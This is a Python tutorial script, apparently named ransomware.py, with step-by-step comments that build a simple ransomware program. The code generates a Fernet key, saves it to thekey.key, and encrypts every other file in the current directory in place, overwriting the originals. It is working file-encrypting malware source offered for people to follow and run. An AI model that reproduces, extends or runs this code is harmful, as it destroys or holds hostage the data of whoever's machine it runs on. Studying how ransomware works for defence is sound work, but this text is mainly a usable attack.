import os

from cryptography.fernet import Fernet

"""
For this tutoial we are going to be using a python library called Fernet.
We'll import it from the module Cryptography.
Fernet is a symmetric encryption method which makes sure that the message encrypted,
cannot be manipulated or read without the encryption key. It uses URL safe encoding for the key
"""


#   First step is to find all files in our current directory and store them in a list

files = []

#   Next we'll use a for loop to add all files in the current directory to our files list
for file in os.listdir():
    if file == 'ransomware.py' or file == 'thekey.key' or file == 'decrypt.py':
        continue
    #   We also need to confirm that we are only grabbing files and not directories
    if os.path.isfile(file):
        files.append(file)

#   We'll create a key that is going to encrypt our files
key = Fernet.generate_key()

#   Next we'll save the key in an external file 
#   So we'll open a file using the with command filename will be "thekey.key" write mode is 'wb' short for write binary

with open('thekey.key','wb') as thekey:
    thekey.write(key)


#   Next we'll encrypt all the files in our file list
for file in files:
    with open(file,"rb") as thefile:
        contents = thefile.read()
    encrypted_content = Fernet(key).encrypt(contents)
    with open(file, 'wb') as thefile:
        thefile.write(encrypted_content)


print(f"Encrpted files: {files} Successfully\n")
"""
In the above snippet, we use a for loop, to iterate over all files in our files list
and for each file, we open it, in read binary mode 'rb', store the contents of the file in  a
variable called contents, then encrypt the contents using Fernetn and store the encrypted contents in
another variable encrypted_contents, then again open the same file in write binary mode 'wb', and we'll 
rewrite the encrypted contents to the file, overwriting the existing content
"""

# Next we'll write a decrypt script that is similar to the encrypt script with few changes